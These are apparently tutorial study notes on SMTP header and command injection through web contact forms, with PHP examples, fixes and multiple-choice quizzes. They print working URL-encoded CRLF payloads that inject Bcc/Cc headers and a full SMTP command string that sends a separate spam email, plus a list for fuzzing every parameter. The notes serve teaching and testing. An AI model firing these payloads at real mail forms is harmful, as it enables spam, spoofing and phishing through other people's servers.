## 🧠 **Section Breakdown: Injecting into Mail Services (SMTP Injection)**

---

### 🔍 **What’s Going On?**

Web applications often let users send messages via contact forms (e.g., feedback, support requests). These forms usually take user input (like message body, subject, from-address) and pass it to a **mail-sending function**, like PHP’s `mail()` or other SMTP libraries.

But here’s the kicker:

> ⚠️ If user input is passed directly into **email headers**, and those inputs are **not sanitized**, then attackers can inject **additional SMTP headers** — leading to **email spoofing**, **BCC spam**, or **even full command injection in some cases**.

---

### 📬 **The Backend Flow (PHP mail() Example)**

Let’s say a legit message looks like this in SMTP:

```
To: admin@wahh-app.com
From: marcus@wahh-mail.com
Subject: Site problem

Confirm Order page doesn’t load
```

The **From address** is supplied by the user and gets added using `additional_headers` in `mail()` like this:

```php
mail($to, $subject, $message, "From: $user_from");
```

BUT...

If the user sends this as input:

```
marcus@wahh-mail.com\nBcc: all@wahh-othercompany.com
```

Then the resulting email becomes:

```
To: admin@wahh-app.com
From: marcus@wahh-mail.com
Bcc: all@wahh-othercompany.com
Subject: Site problem

Confirm Order page doesn’t load
```

📬 That Bcc header? Totally injected. The mail will now secretly be sent to `all@wahh-othercompany.com` too. This is the **header injection vector**.

---

### 🎯 **Key Injection Points**

You can inject malicious headers if:

* You control the `From` field
* Or the `Subject`, `To`, etc.
* And the backend uses those unsanitized inputs directly in SMTP headers

---

### 🔥 **Real-World Abuses**

* **Spammers:** Mass mailing by injecting `Bcc:` lists into feedback forms
* **Spoofing:** Injecting headers to impersonate someone (e.g., `From: admin@bank.com`)
* **Phishing:** Sending fake password reset or order confirmation emails
* **Information leaks:** If mail is sent to unintended parties (through injected headers)

---

### 🛡️ **How to Fix**

* 🧼 **Sanitize input**: Strip CR (`\r`) and LF (`\n`) from all email header fields
* 🧱 Use libraries like `PHPMailer` or `SwiftMailer`, which safely handle headers
* 🚫 Never trust input for sensitive headers like `From`, `Bcc`, `Cc`, etc.
* ✅ Validate email format with a strict regex (e.g., `/^[a-zA-Z0-9._%+-]+@[a-z0-9.-]+\.[a-z]{2,4}$/i`)

---

## 🧪 Example Payloads

These are real SMTP injection payloads used in `From:` fields:

```text
attacker@example.com%0ABcc: spamlist@example.com
attacker@example.com\nCc: friend@example.com
attacker@example.com\r\nBcc: everyone@target.com
```

Some apps double encode inputs, so these variants may work:

```text
attacker@example.com%250ABcc: spam@victim.com  // Double URL encoding of \n
```

---

## 🧩 Practice Questions

---

### **Q1.** Why is the `From` field in a feedback form a common target for SMTP injection?

A) It’s used in the message body directly
B) It’s passed as an argument to system()
C) It’s often inserted directly into SMTP headers
D) It's always encrypted before use

<details>
<summary><strong>Answer:</strong></summary>
**C)** It’s often inserted directly into SMTP headers
</details>

---

### **Q2.** What SMTP header can attackers inject to send a copy of the message to another email address without the user knowing?

A) Subject
B) Cc
C) Bcc
D) To

<details>
<summary><strong>Answer:</strong></summary>
**C)** Bcc
</details>

---

### **Q3.** What encoding is often used to bypass filters during SMTP injection?

A) Base64
B) HTML
C) URL Encoding
D) ROT13

<details>
<summary><strong>Answer:</strong></summary>
**C)** URL Encoding — e.g., `%0A`, `%0D`, or double-encoded like `%250A`
</details>

---

### **Q4.** Which newline characters are most dangerous in SMTP header injection?

A) `\t` and `\v`
B) `\n` and `\r`
C) `\b` and `\a`
D) None, headers are safe

<details>
<summary><strong>Answer:</strong></summary>
**B)** `\n` and `\r` — They mark new header lines.
</details>

---

### **Q5.** Which of the following mitigations is **most** effective against SMTP header injection?

A) Escaping user input
B) Disabling feedback forms
C) Using double URL encoding
D) Removing CRLF characters from headers

<details>
<summary><strong>Answer:</strong></summary>
**D)** Removing CRLF characters from headers
</details>

---


## 🧨 SMTP Command Injection — Explained

### 🧠 What’s Going On?

SMTP injection takes the earlier “email header injection” concept and *cranks it up to 11*. Instead of just injecting headers like `Bcc:` or `Cc:`, now you're *injecting actual SMTP commands* directly into the conversation between the app and the mail server.

If the web app is doing the SMTP conversation manually (or through an insecure mail library), and it includes **user input directly into that conversation**, then we can hijack it.

This is **way worse** than just a Bcc spam — you're now crafting *entire additional emails* and potentially spamming from their server.

---

### 💣 How the Exploit Works

#### 🧾 Legit Flow

When you send feedback via a form:

```
From: daf@wahh-mail.com
Subject: Site feedback
Message: foo
```

It results in:

```http
MAIL FROM: daf@wahh-mail.com
RCPT TO: feedback@wahh-app.com
DATA
From: daf@wahh-mail.com
To: feedback@wahh-app.com
Subject: Site feedback
foo
.
```

The `.` on its own line marks the **end of the message** in SMTP.

---

#### 💉 Exploit Payload (Injected into Subject)

We inject newline characters (`%0d%0a`) into a parameter, like `Subject`, to *break out of the expected context* and write **new SMTP commands**.

Example attack payload (sent in the `Subject` parameter):

```
Subject=Site+feedback%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+mail@wahh-viagra.com%0d%0aRCPT+TO:+john@wahh-mail.com%0d%0aDATA%0d%0aFrom:+mail@wahh-viagra.com%0d%0aTo:+john@wahh-mail.com%0d%0aSubject:+Cheap+V1AGR4%0d%0aBlah%0d%0a%2e%0d%0a
```

That breaks into the SMTP convo and sends an entirely separate message.

So this results in TWO mails:

1. Legit:

   ```
   From: daf@wahh-mail.com
   To: feedback@wahh-app.com
   Subject: Site feedback
   foo
   .
   ```

2. Injected:

   ```
   From: mail@wahh-viagra.com
   To: john@wahh-mail.com
   Subject: Cheap V1AGR4
   Blah
   .
   ```

---

### 🔍 Finding SMTP Injection

**Your job as an attacker or tester:** fire payloads like these into *every parameter*, even the ones that don't seem important.

**Use these payloads (replace `<youremail>`):**

```text
<youremail>%0aCc:<youremail>
<youremail>%0d%0aCc:<youremail>
<youremail>%0aBcc:<youremail>
<youremail>%0d%0aBcc:<youremail>
```

Then more aggressive ones:

```text
%0aDATA%0afoo%0a.%0aMAIL FROM:<youremail>%0aRCPT TO:<youremail>%0aDATA%0aFrom:<youremail>%0aTo:<youremail>%0aSubject:test%0afoo%0a.%0a
```

Try both `%0a` (Unix newline) and `%0d%0a` (Windows newline).

---

### 🧪 How to Test for This

1. **Inject payloads** in all fields (even hidden ones).
2. **Watch for errors** — see if app complains about mail issues.
3. **Monitor your inbox** — check if anything reaches your test email.
4. **Inspect forms** — look for hidden fields like `To`, clues about email backend, etc.

---

### 🔐 How to Prevent It

Hardening email functions is *critical*.

✅ **Sanitize everything** that touches email functions:

* 🧼 Strip or reject newline characters from all inputs.
* 📧 Email fields should be regex-validated (no `\r`, `\n`, `:` allowed).
* 🧵 Subjects should have a length limit and disallow line breaks.
* ⚠️ Disallow single-dot-only lines if you're handling SMTP directly.

🚨 Reminder: Email functions are often treated as “peripheral” by devs — but if exploited, they can turn your app into a **spam cannon**.

---

## 🧠 Practice Questions (5 MCQs)

### 1. What makes SMTP command injection more dangerous than header injection?

**a.** It only affects the Bcc field
**b.** It requires authenticated SMTP access
**c.** It allows full control over SMTP messages
**d.** It’s only possible with file uploads

> **Answer:** c

---

### 2. What is the significance of a single `.` on a line in SMTP?

**a.** Starts a new message
**b.** Escapes HTML
**c.** Ends the SMTP session
**d.** Ends the current DATA message

> **Answer:** d

---

### 3. Which of the following payloads attempts to send a second email?

**a.** `%0aCc:test@test.com`
**b.** `%0d%0aBcc:test@test.com`
**c.** `%0a.%0aMAIL FROM:...`
**d.** `+%2e+`

> **Answer:** c

---

### 4. Which field is often abused in SMTP command injection to sneak in newlines?

**a.** To
**b.** Subject
**c.** Date
**d.** Reply-To

> **Answer:** b

---

### 5. What is the best approach to defend against SMTP command injection?

**a.** Base64 encode the input
**b.** Allow only known recipients
**c.** Escape special SMTP commands
**d.** Rigorously validate and sanitize all user input

> **Answer:** d

---